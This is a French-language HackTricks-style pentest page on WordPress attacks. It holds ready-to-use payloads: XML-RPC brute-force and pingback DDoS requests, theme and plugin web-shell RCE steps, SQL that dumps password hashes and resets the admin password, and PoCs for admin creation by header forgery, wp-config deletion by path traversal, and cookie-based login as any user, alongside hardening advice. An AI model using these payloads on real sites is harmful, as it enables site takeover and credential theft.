# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles comme la version de WordPress installée.
- `wp-activate.php` est utilisé pour le processus d'activation par e-mail lors de la création d'un nouveau site WordPress.
- Dossiers de connexion (peuvent être renommés pour les cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier qui représente une fonctionnalité de WordPress permettant la transmission de données avec HTTP comme mécanisme de transport et XML comme mécanisme d'encodage. Ce type de communication a été remplacé par le WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le répertoire principal où les plugins et thèmes sont stockés.
- `wp-content/uploads/` est le répertoire où tous les fichiers téléchargés sur la plateforme sont stockés.
- `wp-includes/` est le répertoire où se trouvent les fichiers core, tels que certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et supérieures, WordPress génère un fichier sitemap XML avec tous les posts publics et les types de posts et taxonomies consultables publiquement.

**Post-exploitation**

- Le fichier `wp-config.php` contient les informations requises par WordPress pour se connecter à la base de données telles que le nom de la base de données, l'hôte de la base, le nom d'utilisateur et le mot de passe, les clés d'authentification et salts, et le préfixe des tables de la base. Ce fichier de configuration peut également être utilisé pour activer le mode DEBUG, ce qui peut être utile pour le dépannage.

### Permissions des utilisateurs

- **Administrateur**
- **Éditeur** : Publie et gère ses propres posts et ceux des autres
- **Auteur** : Publie et gère ses propres posts
- **Contributeur** : Rédige et gère ses posts mais ne peut pas les publier
- **Abonné** : Parcourt les posts et modifie son profil

## **Énumération passive**

### **Obtenir la version de WordPress**

Vérifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple depuis [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers de liens CSS

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Récupérer les thèmes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en général
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Énumération active

### Plugins and Themes

Vous ne pourrez probablement pas trouver tous les Plugins and Themes possibles. Pour en découvrir la totalité, vous devrez **actively Brute Force a list of Plugins and Themes** (heureusement pour nous, il existe des outils automatisés qui contiennent ces listes).

### Users

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les réponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la réponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez également tenter d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut révéler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publié un post. **Seules les informations concernant les utilisateurs qui ont activé cette fonctionnalité seront fournies**.

Notez aussi que **/wp-json/wp/v2/pages** peut leak des adresses IP.

- **Login username enumeration**: Lors de la connexion via **`/wp-login.php`**, le **message** est **différent**, indiquant si le **username** existe ou non.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer un credentials brute-force ou l'utiliser pour lancer des attaques DoS vers d'autres ressources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Pour vérifier s'il est actif, essayez d'accéder à _**/xmlrpc.php**_ et envoyez cette requête :

**Vérifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des méthodes qui peuvent être utilisées pour effectuer un brute-force des credentials. Si vous parvenez à en trouver une, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une réponse avec code 200 doit s'afficher si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les bons identifiants, vous pouvez téléverser un fichier. Dans la réponse, le chemin apparaîtra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une manière **plus rapide** de brute-force des credentials en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs credentials dans la même requête :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Cette méthode est destinée aux programmes et non aux humains, et est ancienne ; par conséquent elle ne supporte pas la 2FA. Donc, si vous avez des creds valides mais que l'accès principal est protégé par la 2FA, **vous pourriez être capable d'abuser de xmlrpc.php pour vous connecter avec ces creds en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions disponibles via la console, mais vous pourriez quand même parvenir à une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si vous trouvez la méthode _**pingback.ping**_ dans la liste, vous pouvez faire en sorte que Wordpress envoie une requête arbitraire à n'importe quel hôte/port.\
Cela peut être utilisé pour demander à **des milliers** de **sites** Wordpress d'**accéder** au même **emplacement** (provoquant ainsi un **DDoS** sur cette cible) ou vous pouvez l'utiliser pour faire **Wordpress** **scan** un **network** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **supérieure** à **0** (17), cela signifie que le port est ouvert.

Consultez l'utilisation de **`system.multicall`** dans la section précédente pour apprendre comment abuser de cette méthode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier se trouve généralement à la racine du site Wordpress : **`/wp-cron.php`**\
Quand ce fichier est **accessed** une requête MySQL **"heavy"** est exécutée, donc il peut être utilisé par des **attackers** pour **cause** un **DoS**.\
De plus, par défaut, le `wp-cron.php` est appelé à chaque chargement de page (à chaque fois qu'un client demande une page Wordpress), ce qui sur des sites à fort trafic peut poser des problèmes (DoS).

Il est recommandé de désactiver Wp-Cron et de créer un vrai cronjob sur l'hôte qui exécute les actions nécessaires à intervalles réguliers (sans causer de problèmes).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Worpress peut effectuer une requête vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil vérifie si le **methodName: pingback.ping** existe et si le chemin **/wp-json/oembed/1.0/proxy** est présent ; si c'est le cas, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'accès en écrasant un bit

Plutôt qu'une vraie attaque, il s'agit d'une curiosité. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser un bit de n'importe quel fichier wordpress. Ainsi, vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour transformer l'opération NOT (`!`) en NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panneau RCE**

**Modifier un php du thème utilisé (identifiants admin nécessaires)**

Apparence → Éditeur de thème → Modèle 404 (à droite)

Remplacez le contenu par un shell php :

![](<../../images/image (384).png>)

Cherchez sur Internet comment accéder à cette page mise à jour. Dans ce cas vous devez accéder ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Il peut être possible de téléverser des fichiers .php en tant que plugin.\
Créez votre php backdoor en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

Téléversez le plugin et appuyez sur Install Now :

![](<../../images/image (249).png>)

Cliquez sur Procced:

![](<../../images/image (70).png>)

Probablement cela n'agira apparemment pas, mais si vous allez dans Media, vous verrez votre shell téléversé :

![](<../../images/image (462).png>)

Accédez-y et vous verrez l'URL pour exécuter la reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette méthode implique l'installation d'un plugin malveillant connu pour être vulnérable et pouvant être exploité pour obtenir un web shell. Ce processus s'effectue via le tableau de bord WordPress comme suit :

1. **Acquisition du plugin** : Le plugin est obtenu depuis une source comme Exploit DB, par exemple [**here**](https://www.exploit-db.com/exploits/36374).
2. **Installation du plugin** :
- Allez dans le tableau de bord WordPress, puis `Dashboard > Plugins > Upload Plugin`.
- Téléversez le fichier zip du plugin téléchargé.
3. **Activation du plugin** : Une fois le plugin installé avec succès, il doit être activé via le tableau de bord.
4. **Exploitation** :
- Avec le plugin "reflex-gallery" installé et activé, il peut être exploité car il est connu pour être vulnérable.
- Le framework Metasploit fournit un exploit pour cette vulnérabilité. En chargeant le module approprié et en exécutant des commandes spécifiques, une session meterpreter peut être établie, accordant un accès non autorisé au site.
- Il est noté que ceci n'est qu'une des nombreuses méthodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles montrant les étapes dans le tableau de bord WordPress pour installer et activer le plugin. Cependant, il est important de noter que l'exploitation de vulnérabilités de cette façon est illégale et contraire à l'éthique sans autorisation appropriée. Ces informations doivent être utilisées de manière responsable et uniquement dans un contexte légal, tel que penetration testing avec permission explicite.

**Pour des étapes plus détaillées, consultez :** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS à RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script conçu pour escalader une vulnérabilité **Cross-Site Scripting (XSS)** vers une **Remote Code Execution (RCE)** ou d'autres vulnérabilités critiques dans WordPress. Pour plus d'infos, consultez [**cet article**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il offre **un support pour les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :**
- _**Privilege Escalation:**_ Crée un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Téléversez votre plugin personnalisé (backdoor) dans WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Modifie les plugins intégrés dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ Modifie les thèmes intégrés dans WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personnalisés pour des plugins/thèmes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Surface d'attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalités est essentiel pour trouver des vulnérabilités dans celles-ci. Vous pouvez trouver comment un plugin pourrait exposer des fonctionnalités dans les points suivants et quelques exemples de plugins vulnérables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Une des manières dont un plugin peut exposer des fonctions aux utilisateurs est via des handlers AJAX. Ceux-ci peuvent contenir des bugs de logique, d'authorization, ou d'authentication. De plus, il est assez fréquent que ces fonctions basent à la fois l'authentication et l'authorization sur l'existence d'un Wordpress nonce que **tout utilisateur authentifié dans l'instance Wordpress pourrait posséder** (indépendamment de son rôle).

Ce sont les fonctions qui peuvent être utilisées pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible à n'importe quel utilisateur (même non authentifié).**

> [!CAUTION]
> De plus, si la fonction ne vérifie l'autorisation de l'utilisateur qu'avec la fonction `wp_verify_nonce`, cette fonction vérifie seulement que l'utilisateur est connecté, elle ne vérifie généralement pas le rôle de l'utilisateur. Ainsi, des utilisateurs peu privilégiés pourraient accéder à des actions à privilèges élevés.

- **REST API**

Il est également possible d'exposer des fonctions de wordpress en enregistrant une rest AP à l'aide de la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est une fonction de rappel qui vérifie si un utilisateur donné est autorisé à appeler la méthode API.

**Si la fonction interne `__return_true` est utilisée, elle contournera simplement la vérification des permissions utilisateur.**

- **Accès direct au fichier PHP**

Bien sûr, Wordpress utilise PHP et les fichiers à l'intérieur des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalité vulnérable qui est déclenchée simplement en accédant au fichier, elle pourra être exploitée par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Certains plugins implémentent des raccourcis de “trusted header” pour des intégrations internes ou des reverse proxies, puis utilisent cet en-tête pour définir le contexte utilisateur courant pour les requêtes REST. Si l'en-tête n'est pas lié cryptographiquement à la requête par un composant en amont, un attaquant peut le falsifier et accéder aux routes REST privilégiées en tant qu'administrateur.

- Impact : élévation de privilèges non authentifiée vers admin en créant un nouvel administrateur via la core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, généralement le premier compte administrateur).
- Route exploitée : `POST /wp-json/wp/v2/users` avec un tableau de rôle élevé.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi ça fonctionne

- Le plugin mappe un header contrôlé par le client à l'état d'authentification et saute les vérifications de capability.
- WordPress core attend la capability `create_users` pour cette route ; le hack du plugin la contourne en définissant directement le contexte du current user depuis le header.

Indicateurs de succès attendus

- HTTP 201 avec un corps JSON décrivant l'utilisateur créé.
- Un nouvel admin visible dans `wp-admin/users.php`.

Checklist de détection

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des headers personnalisés pour définir le contexte utilisateur (par ex. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les enregistrements REST pour des callbacks privilégiés qui manquent de vérifications robustes `permission_callback` et qui comptent à la place sur des headers de requête.
- Chercher des usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) à l'intérieur des handlers REST qui ne sont protégés que par la valeur d'un header.

Renforcement

- Ne jamais déduire l'authentification ou l'autorisation à partir de headers contrôlés par le client.
- Si un reverse proxy doit injecter l'identité, terminer la confiance au proxy et supprimer les copies entrantes (par ex. `unset X-Wcpay-Platform-Checkout-User` en bordure), puis passer un token signé et le vérifier côté serveur.
- Pour les routes REST exécutant des actions privilégiées, exiger des vérifications `current_user_can()` et un `permission_callback` strict (NE PAS utiliser `__return_true`).
- Préférer l'auth first-party (cookies, application passwords, OAuth) plutôt que l'« impersonation » via headers.

References : voir les liens à la fin de cette page pour un cas public et une analyse plus large.

### Suppression arbitraire de fichiers sans authentification via wp_ajax_nopriv (Litho Theme <= 3.0)

Les themes et plugins WordPress exposent fréquemment des handlers AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilisée **le callback devient accessible aux visiteurs non authentifiés**, donc toute action sensible doit en plus implémenter :

1. Un **contrôle de capability** (par ex. `current_user_can()` ou au moins `is_user_logged_in()`), et
2. Un **nonce CSRF** validé avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. Une **sanitisation / validation stricte des entrées**.

Le thème multipurpose Litho (< 3.1) a oublié ces 3 contrôles dans la fonctionnalité *Remove Font Family* et a fini par livrer le code suivant (simplifié) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Accès non authentifié** – le hook `wp_ajax_nopriv_` est enregistré.
* **Pas de vérification du nonce / des capabilities** – tout visiteur peut appeler le endpoint.
* **Pas de sanitisation du chemin** – la chaîne contrôlée par l'utilisateur `fontfamily` est concaténée à un chemin de fichier sans filtrage, permettant le classique `../../` traversal.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou répertoire **sous le répertoire de base uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requête HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre séquences `../` suffisent sur une installation par défaut. La suppression de `wp-config.php` force WordPress à lancer le *installation wizard* lors de la prochaine visite, permettant une prise de contrôle complète du site (l'attaquant fournit simplement une nouvelle configuration DB et crée un admin user).

D'autres cibles importantes incluent les fichiers plugin/theme `.php` (pour neutraliser les plugins de sécurité) ou les règles `.htaccess`.

#### Liste de contrôle de détection

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers du système de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concaténation d'entrées utilisateur non assainies dans des chemins (recherchez `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

#### Durcissement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** traitez toute opération d'écriture/suppression sur le disque comme privilégiée et vérifiez attentivement :
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Escalade de privilèges via restauration de rôle obsolète et absence d'autorisation (ASE "View Admin as Role")

De nombreux plugins implémentent une fonctionnalité "view as role" ou de changement de rôle temporaire en enregistrant le(s) rôle(s) d'origine dans les user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration repose uniquement sur des paramètres de requête (par ex., `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans vérifier les capabilities et un nonce valide, cela devient une escalade de privilèges verticale.

Un exemple réel a été trouvé dans le plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). La branche de reset restaurait les rôles en se basant sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni un contrôle `current_user_can()` ni une vérification du nonce avant de supprimer les rôles actuels et de réajouter les rôles sauvegardés depuis le user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c’est exploitable

- Fait confiance à `$_REQUEST['reset-for']` et à une option du plugin sans autorisation côté serveur.
- Si un utilisateur avait précédemment des privilèges plus élevés enregistrés dans `_asenha_view_admin_as_original_roles` et a été rétrogradé, il peut les restaurer en accédant au chemin de réinitialisation.
- Dans certains déploiements, tout utilisateur authentifié pouvait déclencher une réinitialisation pour un autre nom d'utilisateur toujours présent dans `viewing_admin_as_role_are` (autorisation cassée).

Attack prerequisites

- Vulnerable plugin version with the feature enabled.
- Target account has a stale high-privilege role stored in user meta from earlier use.
- Any authenticated session; missing nonce/capability on the reset flow.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les builds vulnérables, cela supprime les rôles actuels et réajoute les rôles originaux sauvegardés (par ex., `administrator`), entraînant une escalade de privilèges.

Detection checklist

- Rechercher des fonctionnalités de changement de rôle qui conservent les rôles originaux dans user meta (par ex., `_asenha_view_admin_as_original_roles`).
- Identifier les chemins de reset/restauration qui :
- Lire les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifier les rôles via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
- Autoriser en se basant sur un tableau d'options du plugin (par ex., `viewing_admin_as_role_are`) au lieu des capacités de l'acteur.

Hardening

- Appliquer des contrôles de capacité sur chaque branche modifiant l'état (par ex., `current_user_can('manage_options')` ou plus strict).
- Exiger des nonces pour toutes les modifications de rôle/permission et les vérifier : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne jamais faire confiance aux noms d'utilisateur fournis par la requête ; résoudre l'utilisateur cible côté serveur en fonction de l'acteur authentifié et d'une politique explicite.
- Invalider l'état des rôles originaux lors des mises à jour du profil/du rôle pour éviter la restauration obsolète de privilèges élevés :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un état minimal et d'utiliser des tokens limités dans le temps et protégés par capability pour les changements de rôle temporaires.

---

### Élévation de privilèges sans authentification via user-switching basé sur cookie sur le hook public `init` (Service Finder “sf-booking”)

Certains plugins connectent des helpers de user-switching au hook public `init` et dérivent l'identité depuis un cookie contrôlé par le client. Si le code appelle `wp_set_auth_cookie()` sans vérifier l'authentification, la capability et un nonce valide, tout visiteur non authentifié peut forcer la connexion avec n'importe quel ID utilisateur.

Pattern vulnérable typique (simplifié depuis Service Finder Bookings ≤ 6.1) :
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c'est exploitable

- Le hook public `init` rend le gestionnaire accessible aux utilisateurs non authentifiés (pas de garde `is_user_logged_in()`).
- L'identité est dérivée d'un cookie modifiable par le client (`original_user_id`).
- Un appel direct à `wp_set_auth_cookie($uid)` connecte le requérant en tant que cet utilisateur sans vérification des capabilities/nonce.

Exploitation (sans authentification)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considérations WAF pour les CVE WordPress/plugins

Les WAFs génériques en périphérie/serveur sont configurés pour des motifs larges (SQLi, XSS, LFI). De nombreuses vulnérabilités WordPress/plugins à fort impact sont des bugs de logique d'application ou d'authentification spécifiques à l'application qui ressemblent à du trafic bénin, sauf si le moteur comprend les routes WordPress et la sémantique des plugins.

Notes offensives

- Ciblez les endpoints spécifiques aux plugins avec des payloads propres : `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Testez d'abord les chemins non authentifiés (AJAX `nopriv`, REST avec permissive `permission_callback`, shortcodes publics). Les payloads par défaut réussissent souvent sans obfuscation.
- Cas typiques à fort impact : escalade de privilèges (broken access control), arbitrary file upload/download, LFI, open redirect.

Notes défensives

- Ne comptez pas sur des signatures WAF génériques pour protéger les CVE des plugins. Mettez en place des correctifs virtuels spécifiques à la vulnérabilité au niveau application ou mettez à jour rapidement.
- Privilégiez des contrôles de sécurité en mode positif dans le code (capabilities, nonces, validation stricte des entrées) plutôt que des filtres négatifs basés sur des regex.

## Protection WordPress

### Mises à jour régulières

Assurez-vous que WordPress, les plugins et les thèmes sont à jour. Confirmez également que la mise à jour automatique est activée dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, **n'installez que des plugins et thèmes WordPress fiables**.

### Plugins de sécurité

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur par défaut **admin**
- Utilisez des **mots de passe forts** et **2FA**
- Passez **périodiquement en revue** les **autorisations** des utilisateurs
